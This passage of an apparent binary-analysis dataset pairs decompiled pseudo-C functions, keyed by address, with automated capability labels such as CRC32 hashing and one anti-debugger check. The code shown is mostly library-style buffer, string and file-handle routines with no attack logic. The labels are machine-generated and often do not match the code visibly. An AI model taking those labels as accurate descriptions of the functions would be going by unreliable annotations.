+ 0xa0) = iVar1;\n            *(param_1 + 0xa4) = iVar2 - *(param_1 + 0x60);\n            *(param_1 + 0xa8) = iVar6;\n            *(param_1 + 0xac) = iVar2;\n            *(param_1 + 0xb0) = iVar1;\n            *(param_1 + 0xb4) = iVar7;\n            *(param_1 + 0xb8) = iVar6;\n            *(param_1 + 0xbc) = iVar2;\n            *(param_1 + 0xc0) = *(param_1 + 0x5c) + iVar6;\n            *(param_1 + 0xc4) = iVar7;\n            *(param_1 + 200) = iVar1 - *(param_1 + 0x5c);\n            *(param_1 + 0xcc) = iVar2;\n            *(param_1 + 0xd0) = iVar1;\n        }\n        iVar7 = *(param_1 + 0x13c);\n        iVar6 = fcn.00444bf8();\n        pcVar3 = _sym.imp.USER32.dll_LoadBitmapA;\n        uVar4 = (*_sym.imp.USER32.dll_LoadBitmapA)(*(iVar6 + 0xc), (-(iVar7 != 0) & 0xfffb) + 0xce);\n        fcn.00433a59(uVar4);\n        iVar7 = *(param_1 + 0x13c);\n        iVar6 = fcn.00444bf8();\n        uVar4 = (*pcVar3)(*(iVar6 + 0xc), (-(iVar7 != 0) & 0xfffb) + 0xcf);\n        fcn.00433a59(uVar4);\n    }\n    return iVar5;\n}\n",
        "token_count": 951
    },
    "0040d9f5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d9f5(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uchar unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 1;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 199
    },
    "0040da2d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040da2d(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 235
    },
    "0040da6f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040da6f(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 235
    },
    "0040dab1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dab1(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    ushort unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 2;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 198
    },
    "0040daed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040daed(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 199
    },
    "0040db28": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040db28(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 199
    },
    "0040db63": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040db63(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 199
    },
    "0040db9e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.0040db9e(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.00434f6a();\n    }\n    **(param_1 + 0x28) = CONCAT44(unaff_retaddr, unaff_ESI);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 229
    },
    "0040dbd9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dbd9(int32_t param_1)\n\n{\n    uchar *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 1U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 1);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "0040dc18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dc18(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 224
    },
    "0040dc60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dc60(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 224
    },
    "0040dca8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dca8(int32_t param_1)\n\n{\n    ushort *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 2);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "0040dceb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dceb(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 193
    },
    "0040dd2d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dd2d(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "0040dd6f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040dd6f(int32_t param_1)\n\n{\n    ulong *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "0040ddb1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ddb1(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043586f(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00434fe1((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 193
    },
    "0040e027": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0040e0ea)\n\nvoid __cdecl fcn.0040e027(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *in_ECX;\n    uint32_t uVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_ECX[2] != 0) {\n        *arg_8h = *in_ECX;\n        arg_8h[1] = in_ECX[1];\n        arg_8h[2] = in_ECX[2];\n        return;\n    }\n    uVar3 = in_ECX[1];\n    uVar5 = *in_ECX;\n    if (((uVar5 | uVar3) == 0) || (arg_ch == 0)) {\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        return;\n    }\n    uVar1 = arg_ch >> 0x18 ^ uVar3 >> 0x18;\n    if ((uVar3 < 1) && (uVar3 < 0)) {\n        bVar6 = uVar5 != 0;\n        uVar5 = -uVar5;\n        uVar3 = -(uVar3 + bVar6);\n    }\n    uVar4 = fcn.00411e15(arg_ch);\n    uVar7 = fcn.004128f0(uVar3, 0, uVar4, 0);\n    if ((uVar7 >> 0x20 == 0) && (uVar7 < 0x80000001)) {\n        uVar8 = fcn.004128f0(uVar5, 0, uVar4, 0);\n        iVar9 = fcn.004128f0(uVar7, 0, 0, 1);\n        uVar2 = uVar8 + iVar9;\n        if (uVar8 <= uVar2) {\n            if (uVar1 < '\\0') {\n                uVar2 = CONCAT44(-((uVar2 >> 0x20) + (uVar2 != 0)), -uVar2);\n            }\n            if (-1 < (uVar2 >> 0x20 ^ arg_ch ^ in_ECX[1])) {\n                uVar3 = 0;\n                goto code_r0x0040e126;\n            }\n        }\n    }\n    uVar3 = 1;\n    if (uVar1 < '\\0') {\n        uVar2 = 0x8000000000000000;\n    }\n    else {\n        uVar2 = 0x7fffffffffffffff;\n    }\ncode_r0x0040e126:\n    *arg_8h = uVar2;\n    arg_8h[1] = uVar2 >> 0x20;\n    arg_8h[2] = uVar3;\n    return;\n}\n",
        "token_count": 747
    },
    "0040e9c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl\nfcn.0040e9c0(int32_t noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_8h\n            , uint arg_ch, uint arg_10h)\n\n{\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t iVar1;\n    uint unaff_retaddr;\n    int32_t var_ch;\n    \n    if ((~*(noname_0 + 0x18) & 1) == 0) {\n        iVar1 = noname_2;\n        if (noname_2 != 0) {\n            do {\n                fcn.0040e741(noname_0, var_ch, noname_0, unaff_ESI, unaff_EBP, unaff_retaddr, noname_0, var_ch, noname_2\n                             , noname_3, noname_4, noname_5, arg_8h, arg_ch, arg_10h);\n                var_ch = var_ch + 0x10;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else if (noname_2 != 0) {\n        do {\n            fcn.0040d1c8(var_ch);\n            fcn.0040e523();\n            var_ch = var_ch + 0x10;\n            noname_2 = noname_2 + -1;\n        } while (noname_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "00418650": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.00418650(uint *param_1, uint8_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    if ((param_1 & 3) != 0) {\n        if ((param_1 & 1) != 0) {\n            uVar3 = *param_1;\n            param_1 = param_1 + 1;\n            bVar4 = uVar3 < *param_2;\n            if (uVar3 != *param_2) goto code_r0x00418694;\n            param_2 = param_2 + 1;\n            if (uVar3 == 0) {\n                return 0;\n            }\n            if ((param_1 & 2) == 0) goto code_r0x00418660;\n        }\n        uVar1 = *param_1;\n        param_1 = param_1 + 2;\n        uVar3 = uVar1;\n        bVar4 = uVar3 < *param_2;\n        if (uVar3 != *param_2) goto code_r0x00418694;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar1 >> 8;\n        bVar4 = uVar3 < param_2[1];\n        if (uVar3 != param_2[1]) goto code_r0x00418694;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        param_2 = param_2 + 2;\n    }\ncode_r0x00418660:\n    while( true ) {\n        uVar2 = *param_1;\n        uVar3 = uVar2;\n        bVar4 = uVar3 < *param_2;\n        if (uVar3 != *param_2) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 8;\n        bVar4 = uVar3 < param_2[1];\n        if (uVar3 != param_2[1]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x10;\n        bVar4 = uVar3 < param_2[2];\n        if (uVar3 != param_2[2]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x18;\n        bVar4 = uVar3 < param_2[3];\n        if (uVar3 != param_2[3]) break;\n        param_2 = param_2 + 4;\n        param_1 = param_1 + 1;\n        if (uVar3 == 0) {\n            return 0;\n        }\n    }\ncode_r0x00418694:\n    return bVar4 * -2 + 1;\n}\n",
        "token_count": 671
    },
    "00415afa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415afa(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_ch;\n    uVar1 = arg_ch[3];\n    arg_8h_00 = arg_ch[4];\n    if (((uVar1 & 0x82) == 0) || ((uVar1 & 0x40) != 0)) {\ncode_r0x00415c06:\n        arg_ch[3] = uVar1 | 0x20;\n    }\n    else {\n        if ((uVar1 & 1) != 0) {\n            arg_ch[1] = 0;\n            if ((uVar1 & 0x10) == 0) goto code_r0x00415c06;\n            *arg_ch = arg_ch[2];\n            arg_ch[3] = uVar1 & 0xfffffffe;\n        }\n        uVar1 = arg_ch[3];\n        arg_ch[1] = 0;\n        arg_ch = NULL;\n        piVar2[3] = uVar1 & 0xffffffef | 2;\n        if (((uVar1 & 0x10c) == 0) &&\n           (((piVar2 != 0x464988 && (piVar2 != 0x4649a8)) || (iVar3 = fcn.0041c056(arg_8h_00),  iVar3 == 0)))) {\n            fcn.0041c012(piVar2);\n        }\n        if ((*(piVar2 + 3) & 0x108) == 0) {\n            iVar3 = 1;\n            arg_ch = fcn.0041bf67(arg_8h_00, &arg_8h, 1);\n        }\n        else {\n            iVar4 = piVar2[2];\n            iVar3 = *piVar2;\n            *piVar2 = iVar4 + 1;\n            iVar3 = iVar3 - iVar4;\n            piVar2[1] = piVar2[6] + -1;\n            if (iVar3 < 1) {\n                if (arg_8h_00 == 0xffffffff) {\n                    iVar4 = 0x4645e0;\n                }\n                else {\n                    iVar4 = *((arg_8h_00 >> 5) * 4 + 0x4685e0) + (arg_8h_00 & 0x1f) * 0x24;\n                }\n                if ((*(iVar4 + 4) & 0x20) != 0) {\n                    fcn.0041bcee(arg_8h_00, 0, 2);\n                }\n            }\n            else {\n                arg_ch = fcn.0041bf67(arg_8h_00, iVar4, iVar3);\n            }\n            *piVar2[2] = arg_8h;\n        }\n        if (arg_ch == iVar3) {\n            return arg_8h & 0xff;\n        }\n        piVar2[3] = piVar2[3] | 0x20;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 728
    },
    "0041b82f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0041b82f(void)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t unaff_BX;\n    \n    uVar1 = 0;\n    if ((unaff_BX & 1) != 0) {\n        uVar1 = 0x10;\n    }\n    if ((unaff_BX & 4) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((unaff_BX & 8) != 0) {\n        uVar1 = uVar1 | 4;\n    }\n    if ((unaff_BX & 0x10) != 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((unaff_BX & 0x20) != 0) {\n        uVar1 = uVar1 | 1;\n    }\n    if ((unaff_BX & 2) != 0) {\n        uVar1 = uVar1 | 0x80000;\n    }\n    uVar2 = unaff_BX & 0xc00;\n    if ((unaff_BX & 0xc00) != 0) {\n        if (uVar2 == 0x400) {\n            uVar1 = uVar1 | 0x100;\n        }\n        else if (uVar2 == 0x800) {\n            uVar1 = uVar1 | 0x200;\n        }\n        else if (uVar2 == 0xc00) {\n            uVar1 = uVar1 | 0x300;\n        }\n    }\n    if ((unaff_BX & 0x300) == 0) {\n        uVar1 = uVar1 | 0x20000;\n    }\n    else if ((unaff_BX & 0x300) == 0x200) {\n        uVar1 = uVar1 | 0x10000;\n    }\n    if ((unaff_BX & 0x1000) != 0) {\n        uVar1 = uVar1 | 0x40000;\n    }\n    return uVar1;\n}\n",
        "token_count": 474
    },
    "0041bcee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041bcee(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x456db0, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x4685cc) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4685e0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0041fdc6(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.004131f5();\n                *puVar3 = 9;\n                puVar3 = fcn.004131fe();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0041bc7a(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041bd75();\n            goto code_r0x0041bd93;\n        }\n    }\n    puVar3 = fcn.004131f5();\n    *puVar3 = 9;\n    puVar3 = fcn.004131fe();\n    *puVar3 = 0;\ncode_r0x0041bd93:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 518
    },
    "0041bf67": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041bf67(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x456dc0, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x4685cc) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4685e0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0041fdc6(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.004131f5();\n                *puVar3 = 9;\n                puVar3 = fcn.004131fe();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0041bd99(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041bfee();\n            goto code_r0x0041c00c;\n        }\n    }\n    puVar3 = fcn.004131f5();\n    *puVar3 = 9;\n    puVar3 = fcn.004131fe();\n    *puVar3 = 0;\ncode_r0x0041c00c:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 519
    },
    "0041fbdf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041fbdf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x457e48, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x4685cc) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4685e0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0041fdc6(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.004131f5();\n                *puVar3 = 9;\n                puVar3 = fcn.004131fe();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0041fa04(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041fc66();\n            goto code_r0x0041fc84;\n        }\n    }\n    puVar3 = fcn.004131f5();\n    *puVar3 = 9;\n    puVar3 = fcn.004131fe();\n    *puVar3 = 0;\ncode_r0x0041fc84:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 517
    },
    "0041fd85": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0041fd85(uint32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 < *0x4685cc) &&\n       (puVar1 = *((param_1 >> 5) * 4 + 0x4685e0) + (param_1 & 0x1f) * 0x24,  (*(puVar1 + 1) & 1) != 0)) {\n        return *puVar1;\n    }\n    puVar1 = fcn.004131f5();\n    *puVar1 = 9;\n    puVar1 = fcn.004131fe();\n    *puVar1 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 161
    },
    "0041fe88": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041fe88(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00412580(0x457e68, 0x14);\n    *(unaff_EBP + -0x1c) = 0xffffffff;\n    iVar2 = fcn.00416585(0xb);\n    if (iVar2 != 0) {\n        fcn.00416625(0xb);\n        *(unaff_EBP + -4) = 0;\n        for (iVar2 = 0; *(unaff_EBP + -0x24) = iVar2,  iVar2 < 0x40; iVar2 = iVar2 + 1) {\n            puVar4 = *(iVar2 * 4 + 0x4685e0);\n            if (puVar4 == NULL) {\n                puVar4 = fcn.0041101f(0x480);\n                *(unaff_EBP + -0x20) = puVar4;\n                if (puVar4 != NULL) {\n                    piVar1 = iVar2 * 4 + 0x4685e0;\n                    *piVar1 = puVar4;\n                    *0x4685cc = *0x4685cc + 0x20;\n                    while (puVar4 < *piVar1 + 0x480) {\n                        *(puVar4 + 1) = 0;\n                        *puVar4 = 0xffffffff;\n                        *(puVar4 + 5) = 10;\n                        puVar4[2] = 0;\n                        puVar4 = puVar4 + 9;\n                        *(unaff_EBP + -0x20) = puVar4;\n                    }\n                    *(unaff_EBP + -0x1c) = iVar2 << 5;\n                    